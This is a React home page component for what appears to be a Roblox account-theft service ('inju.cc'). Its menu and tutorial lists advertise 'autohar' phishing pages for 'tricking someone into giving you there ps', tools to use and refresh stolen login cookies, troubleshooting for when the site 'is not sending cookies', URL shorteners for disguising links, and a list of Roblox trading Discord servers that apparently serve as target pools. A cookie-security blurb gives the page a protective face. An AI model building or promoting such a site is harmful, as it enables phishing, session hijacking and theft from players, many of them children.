import { useRef } from 'react';
import Background from "@/components/Background";
import CircularMenu from "@/components/CircularMenu";
import PulsatingTitle from "@/components/PulsatingTitle";
import GuidedTour from "@/components/GuidedTour";
import AiChat from "@/components/AiChat";
import Suggestions from "@/components/Suggestions";
import VideoTutorials from "@/components/VideoTutorials";
import { Info, Shield, MessageCircle } from 'lucide-react';

const menuItems = [
  {
    id: 1,
    label: "INJU.CC",
    info: "This is the main website to the inju.cc domain, if you are new please follow troubleshooting steps",
    link: "https://inju.cc/u/MainControlPage"
  },
  {
    id: 2,
    label: "DISCORD",
    info: "Join the Offical server for downtimes, updates, and more!!!",
    link: "https://discord.gg/injuv3"
  },
  {
    id: 3,
    label: "AUTOHAR",
    info: "Autohar is a way of tricking someone into giving you there ps through a website (AUTOHAR IS NOT MINE)",
    link: "https://bloxtools.in/controlPage/create"
  },
  {
    id: 4,
    label: "REFRESHER",
    info: "Refresh your cookies that you get to prevent theft over others if wanted",
    link: "https://inju.cc/tools/refresher"
  },
  {
    id: 5,
    label: "TROUBLESHOOT",
    info: "If you are new or if site is not sending cookies, or hit title is something other than 'INJURIES' Use this",
    link: "https://discord.com/channels/1286805719911370783/1333224210398445588"
  },
  {
    id: 6,
    label: "YOUTUBE",
    info: "We currently dont have one at the moment",
    link: "https://discord.gg/injuv3"
  }
];

const tutorialVideos = [
  {
    id: "tiktok",
    title: "How to Go Live on TikTok",
    description: "Step by step tutorial on starting a TikTok live stream",
    url: "https://www.youtube.com/watch?si=jz0T6mqcr1T3pB-0&v=Yx2jTQ4g5Mc&feature=youtu.be"
  },
  {
    id: "inju-domain",
    title: "How to Use the INJU.CC Domain",
    description: "Complete guide on using the INJU.CC domain effectively",
    url: "https://cdn.discordapp.com/attachments/1321963106141995078/1331076720438149172/BF1E439E-953D-44D3-A66B-4DB2A2813425.mov"
  },
  {
    id: "cookie-pc",
    title: "How To Use Cookie (PC)",
    description: "Tutorial for PC users on cookie management",
    url: "https://streamable.com/qy3kc4"
  },
  {
    id: "cookie-iphone",
    title: "How to Use Cookie (iPhone)",
    description: "iPhone-specific tutorial for cookie management",
    url: "https://streamable.com/9mfj27"
  },
  {
    id: "cookie-android",
    title: "How to Use Cookie (Android)",
    description: "Android-specific tutorial for cookie management",
    url: "https://streamable.com/75qpxd"
  },
  {
    id: "cookie-setup",
    title: "How to Setup Cookie",
    description: "General setup guide for cookie configuration",
    url: "https://streamable.com/c98on3"
  },
  {
    id: "cc-autohar",
    title: "CC AUTOHAR",
    description: "Tutorial for CC AUTOHAR system",
    url: "https://streamable.com/kr96mr"
  },
  {
    id: "fbot-autohar",
    title: "FBOT AUTOHAR",
    description: "Guide for FBOT AUTOHAR implementation",
    url: "https://streamable.com/opjylx"
  },
  {
    id: "cg-autohar",
    title: "CG AUTOHAR",
    description: "Complete guide for CG AUTOHAR system",
    url: "https://streamable.com/q1g0fh"
  }
];

const urlShorteners = [
  "https://www.shorturl.asia/en/",
  "https://is.gd/",
  "https://spoo.me/",
  "https://click.ly/",
  "https://tiny.cc/",
  "https://shorter.me/",
  "https://shorter.gg/"
];

const communityDiscords = [
  "https://discord.com/invite/pet-simulator-x-community-903938665514938388",
  "https://discord.com/invite/psxc",
  "https://discord.com/invite/biggames",
  "https://discord.com/invite/ps99",
  "https://discord.com/invite/amtv",
  "https://discord.com/invite/adoptme",
  "https://discord.com/invite/adoptmeplaza",
  "https://discord.com/invite/amd",
  "https://discord.com/invite/bloxtrade",
  "https://discord.gg/RaSnrgpn",
  "https://discord.gg/123demands-ps99-values-trading-1180168770547880067",
  "https://discord.gg/eternaltrading",
  "https://discord.com/invite/bloxzy",
  "https://discord.com/invite/fantasyplays",
  "https://discord.com/invite/officialnoobie",
  "https://discord.com/invite/waikol",
  "https://discord.com/invite/bloxy",
  "https://discord.com/invite/branslam",
  "https://discord.com/invite/dheurope",
  "https://discord.com/invite/dhmarket",
  "https://discord.com/invite/dhcasino",
  "https://discord.com/invite/dhvalues"
];

export default function Home() {
  const infoSectionRef = useRef<HTMLDivElement>(null);

  return (
    <div className="min-h-screen w-full bg-black">
      <Background />

      {/* Hero Section with Circular Menu */}
      <div className="relative z-10 w-full h-screen flex items-center justify-center">
        <PulsatingTitle />
        <CircularMenu items={menuItems} />
      </div>

      <GuidedTour />

      {/* Scroll indicator */}
      <div className="absolute bottom-8 left-1/2 -translate-x-1/2 text-white animate-bounce">
        <p className="text-sm mb-2">Scroll to learn more</p>
        <div className="w-6 h-10 border-2 border-white rounded-full mx-auto">
          <div className="w-1 h-2 bg-white rounded-full mx-auto mt-2 animate-pulse" />
        </div>
      </div>

      {/* Information Section */}
      <section ref={infoSectionRef} className="relative z-10 w-full py-20 px-4 md:px-8 bg-black/80">
        <div className="max-w-4xl mx-auto space-y-16">
          {/* Roblox Cookies Info */}
          <div className="space-y-8">
            <div className="flex items-center gap-4">
              <Shield className="w-8 h-8 text-red-500" />
              <h2 className="text-3xl font-bold text-white">Understanding Roblox Account Cookies</h2>
            </div>
            <div className="prose prose-invert">
              <p className="text-gray-300">
                Roblox cookies are essential pieces of data that help maintain your login session. Understanding how they work and how to protect them is crucial for account security.
              </p>
              <ul className="space-y-4 text-gray-300">
                <li>Cookies contain encrypted authentication information</li>
                <li>Never share your cookies with untrusted sources</li>
                <li>Regularly refresh your cookies to maintain security</li>
                <li>Use our tools to manage and protect your account effectively</li>
              </ul>
            </div>
          </div>

          {/* Discord Community */}
          <div className="space-y-8">
            <div className="flex items-center gap-4">
              <MessageCircle className="w-8 h-8 text-red-500" />
              <h2 className="text-3xl font-bold text-white">Join Our Discord Community</h2>
            </div>
            <div className="prose prose-invert">
              <p className="text-gray-300">
                Our Discord server is the hub of our community, offering:
              </p>
              <ul className="space-y-4 text-gray-300">
                <li>Real-time support from experienced members</li>
                <li>Instant notifications about downtimes and updates</li>
                <li>Exclusive tips and tutorials</li>
                <li>A friendly community of like-minded individuals</li>
              </ul>
              <a 
                href="https://discord.gg/injuv3" 
                target="_blank" 
                rel="noopener noreferrer"
                className="inline-block mt-6 px-6 py-3 bg-red-500 text-white rounded-md hover:bg-red-600 transition-colors"
              >
                Join Discord Server
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Video Tutorials Section */}
      <section className="relative z-10 w-full bg-black/90 border-t border-red-500/20">
        <VideoTutorials videos={tutorialVideos} />
      </section>

      {/* URL Shorteners Section */}
      <section className="relative z-10 w-full py-20 px-4 md:px-8 bg-black/80 border-t border-red-500/20">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl font-bold text-white mb-8">URL Shorteners</h2>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
            {urlShorteners.map((url, index) => (
              <a
                key={index}
                href={url}
                target="_blank"
                rel="noopener noreferrer"
                className="px-4 py-3 bg-black/50 border border-red-500 rounded-lg text-white hover:bg-red-500/10 transition-colors"
              >
                {new URL(url).hostname.replace('www.', '')}
              </a>
            ))}
          </div>
        </div>
      </section>

      {/* Community Discords Section */}
      <section className="relative z-10 w-full py-20 px-4 md:px-8 bg-black border-t border-red-500/20">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl font-bold text-white mb-8">Community Discord Servers</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {communityDiscords.map((url, index) => {
              const serverName = url.split('/').pop()?.replace(/-/g, ' ').toUpperCase() || 'Discord Server';
              return (
                <a
                  key={index}
                  href={url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-4 py-3 bg-black/50 border border-red-500 rounded-lg text-white hover:bg-red-500/10 transition-colors"
                >
                  {serverName}
                </a>
              );
            })}
          </div>
        </div>
      </section>

      {/* AI Chat Section */}
      <section className="relative z-10 w-full bg-black/90 border-t border-red-500/20">
        <AiChat />
      </section>

      {/* Suggestions Section */}
      <section className="relative z-10 w-full bg-black border-t border-red-500/20">
        <Suggestions />
      </section>
    </div>
  );
}